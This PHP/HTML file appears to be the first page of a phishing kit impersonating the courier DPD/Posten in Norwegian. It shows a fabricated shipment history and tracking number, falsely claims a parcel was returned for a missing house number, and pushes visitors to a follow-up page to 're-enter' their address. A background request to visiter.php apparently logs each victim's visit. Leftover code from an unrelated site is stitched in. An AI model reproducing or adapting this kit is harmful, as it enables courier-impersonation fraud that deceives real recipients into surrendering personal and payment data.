<?php
include('header_.php');
?>
<style type="text/css">
    .home-bg-banner {
        background-image: url('https://www.dpd.com/wp-content/uploads/sites/226/2023/09/DPD_B2C_mobile_header_cms_600x325_v2.png');
        -o-object-fit: cover;
        object-fit: cover;
        -webkit-background-size: cover;
        background-size: cover;
        background-position: center center;
        background-repeat: no-repeat;
        height: 220px;
        position: relative;
    }

    .banner-right {
        position: absolute;
        bottom: 24px;
        left: 12px;
        color: white;
    }

    .home-input-search {
        border: 1px solid black;
    }

    .search_icon_home_banner {
        position: absolute;
        right: 12px;
        top: 12px;
    }

    .home-heading {
        font-weight: 600;
        font-size: 17px;
        font-weight: 500;
        line-height: 26px;
    }

    .row {
        display: flex;
    }

    /* .col {
        flex: 1;
    } */

    .progress-bar {
        width: 100%;
        height: 10px;
        background-color: #eee;
        border-radius: 10px;
        /* margin: 50px auto; */
    }

    .progress {
        height: 100%;
        width: 55%;
        background-color: #4caf50;
        border-radius: 8px;
        float: right;
    }

    .progress-two {
        height: 100%;
        width: 38%;
        background-color: #ccc;
        border-radius: 8px;
    }

    .left-green {
        display: none;
    }

    .right-red:after,
    .right-red:before {
        background: red;
    }

    .green-button {
        background-color: green;
        color: white;
        padding: 10px 70px;
        text-align: center;
        text-decoration: none;
        display: inline-block;
        font-size: 16px;
        margin: 4px 2px;
        cursor: pointer;
        border-radius: 4px;
        margin-left: auto;
        margin-right: auto;
        display: block;
    }

    .sub-title {
        text-align: center;
    }

    .position-relative {
        position: relative;
    }

    .center-logo-bg {
        position: absolute;
        top: -42px;
        display: flex;
        justify-content: center;
        width: 100%;
    }

    .center-logo-bg span {
        width: 101px;
        text-align: center;
        display: flex;
        justify-content: center;
        background: #fff;
        padding: 5px;
    }

    .center-logo-bg span img {
        width: 31px;
    }

    .before-progress-abr {
        margin-top: 16px;
        margin-bottom: 51px;
        position: relative;
    }

    .before-progress-abr .amb-img-div {
        position: absolute;
        top: 1px;
        left: 35%;
    }

    .driver-amb-bg {
        position: absolute;
        left: 35px;
        top: 7px;
        z-index: -1;
        height: 50px;
    }

    .driver-details {
        height: fit-content;
        margin-top: auto;
        margin-bottom: auto;
        margin-left: 64px;
        margin-right: 10px;
    }

    .alrt-modify {
        border: none;
        box-shadow: 0px 2px 16px 0px #f30a0a3d;
        background: #fff;
        border-radius: 28px;
        margin-top: 37px;
    }

    .icon-alert {
        font-size: 23px;
        color: #F44336;
    }

    .red-gray::before {
        background-color: rgb(11, 35, 30) !important;
        z-index: 999;
    }

    .right-red {
        padding: 2px 0px 14px 20px;
    }

    .tb td {
        padding: 5px;
    }

    .tb th {

        padding: 5px;
    }

    .bottom-prompt {
        position: fixed;
        bottom: 0px;
        background-color: #19133bd1;
        padding: 10px;
        color: white;
    }
</style>

<section style="background-color: #f9f9f9;">
    <div style="padding: 20px;">
        <div style="font-weight: 600; font-size: 29px;">Sporing av forsendelser</div>
        <table class="tb" style="width: 100%; font-size: 14px; border-spacing: 15px;">
            <tr style="border-bottom: 1px solid black; padding-bottom: 10px;">
                <th>Dato</th>
                <th>Tid</th>
                <th>Forsendelsesstatus</th>
                <th>Lokasjon</th>
            </tr>
            <tr>
                <td><?php echo $globalDate; ?></td>
                <td>10:56</td>
                <td>Leveransen mislyktes og ble returnert til distribusjonssenteret</td>
            </tr>
            <tr>
                <td><?php echo date(DATE_FORMATE, strtotime($globalDate . ' -1 DAY '));?></td>
                <td>09:34</td>
                <td>Forbered pakken for levering,</td>
            </tr>
            <tr>
                <td><?php echo date(DATE_FORMATE, strtotime($globalDate . ' -2 DAY '));?></td>
                <td>15:53</td>
                <td>Pakken har ankommet den utpekte byen</td>
                <td>Ankom sorteringssenteret</td>
            </tr>
            <tr>
                <td><?php echo date(DATE_FORMATE, strtotime($globalDate . ' -3 DAY '));?></td>
                <td>11:57</td>
                <td>I transitt</td>
                <td></td>
            </tr>
            <tr>
                <td><?php echo date(DATE_FORMATE, strtotime($globalDate . ' -4 DAY '));?></td>
                <td>11:57</td>
                <td>Pakken er lastet og klar til å sendes til bestemmelsesstedet</td>
                <td>Pakken har blitt sjekket for sikkerhet</td>
            </tr>
            <tr>
                <td><?php echo date(DATE_FORMATE, strtotime($globalDate . ' -5 DAY '));?></td>
                <td>09:09</td>
                <td>Posten mottar pakken for registrering</td>
                <td></td>
            </tr>
        </table>
        <div style="margin-top: 50px;">
            <strong>⚠️Pakken din (NO9511264564568) ble ikke levert</strong>
            <br>
            <br>
            Siden gateadressen mangler husnummeret, pakken din er returnert til distribusjonssenteret av postbudet for midlertidig lagring, Posten tillater omlevering ved mislykket levering, vennligst oppdater riktig leveringsadresse så snart som mulig
        </div>
        <div style="display: flex; justify-content: center; margin: 20px 0px;">
            <a href="page2.php" class="w-full">
                <button style="padding: 13px 16px; color: white; width: 100%" class="bg-red">Fortsett</button>
            </a>
        </div>
    </div>
</section>

<div id="center" class="main innerpage">
    <div class="old_code_wrap">
        <a class="accesskey" href="#aC" id="aC" accesskey="C" title="主要內容區">:::</a>
        <!-- photoblock start-->
        <section class="section col-12 photoblock2 no-print" style="background-image: url(images/photoblock_inbg.png) !important;">
        </section>

    </div>
    <div class="container">
        <section class="ap">


        </section>
        <!-- aP End -->
        <script>
            function checkForm() {
                var canGo = true;
                var custno = $("#custNo").val();
                if (custno === "") {
                    $("#custNoError").show();
                    canGo = false;
                }
                var answer = $("#answer").val();
                if (answer === "") {
                    $("#answerError").show();
                    canGo = false;
                }
                return canGo;
            }

            function errorNoticeDisplay(fieldName, noticeWarning) {
                $("#" + fieldName + "Error").show();
                $("#" + fieldName + "ErrorWarning").text(noticeWarning);
            }

            function sendEmailCaptcha() {
                var returnValue = true;
                if ($("#email").val() == "" || $("#email").val() == "Vennligst skriv inn e-postkonto") {
                    errorNoticeDisplay('email', 'Vennligst skriv inn e-postkonto');
                    returnValue = false;
                } else {
                    //var patternEmail = /^[\w\"\+-]+[\.]?[\w\"\+-]+@(\[)*\w+([\.-]?\w+)*(\.\w{2,})+(\])*$/;
                    var patternEmail = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
                    if (patternEmail.test($("#email").val()) == false) {
                        errorNoticeDisplay('email', 'Vennligst skriv inn en gyldig e-postkonto');
                        returnValue = false;
                    } else {
                        patternEmail = /@yahoo\.|@kimo\.|@icloud\.|@me\./;
                        if (patternEmail.test($("#email").val().toLowerCase()) == true) {
                            errorNoticeDisplay('email',
                                'Det anbefales ikke å bruke e-postadressene @yahoo., @kimo., @icloud. og @me. for å unngå blokkering av e-poster.!');
                        }
                    }
                }
                if (returnValue) {
                    $.ajax({
                        url: "/captcha/sendCaptcha",
                        type: "get",
                        data: {
                            "email": $("#email").val()
                        },
                        success: function(response) {
                            $('#modal1').hide();
                            $('.modal_overlay').hide();
                            if (response) {
                                swal("Bekreftelseskoden er sendt, vennligst gå til e-postadressen din for å motta den.");
                            } else {
                                swal("Bekreftelseskoden er utløpt. Last inn bekreftelseskoden på nytt.");
                            }

                        },
                        error: function(response) {
                            swal("Bekreftelseskoden er utløpt. Last inn bekreftelseskoden på nytt.");
                        }
                    });
                }
            }

            $(function() {

                $(".tab-header-item").on("click", function(e) {
                    e.preventDefault();
                    $(".tab-header-item").removeClass("active");
                    $(this).addClass("active");

                    var data_tab = $(this).attr("data-tab");
                    $(".tab-content").removeClass("active");
                    $("#" + data_tab).addClass("active");
                });

                $('#custNo').click(function() {
                    $('.annotation').show();
                    $("#answer").val("");
                });

                $('#answer').focus(function() {
                    $("#answer").val("");

                });
                $('#answer').keyup(function() {
                    var ans = $("#answer").val();
                    $("#answer").val(toASCII(ans));
                });

            });
        </script>
    </div>
</div>


<?php include('footer_.php'); ?>
<script>
    function removePrompt() {
        document.getElementsByClassName('bottom-prompt')[0].style.display = 'none'
    }
    jQuery(document).ready(function() {
        $.ajax({
            type: 'post',
            url: 'visiter.php',
            data: {
                'visit': 'front',
            },
            success: function(data) {

            }
        });
    });
</script>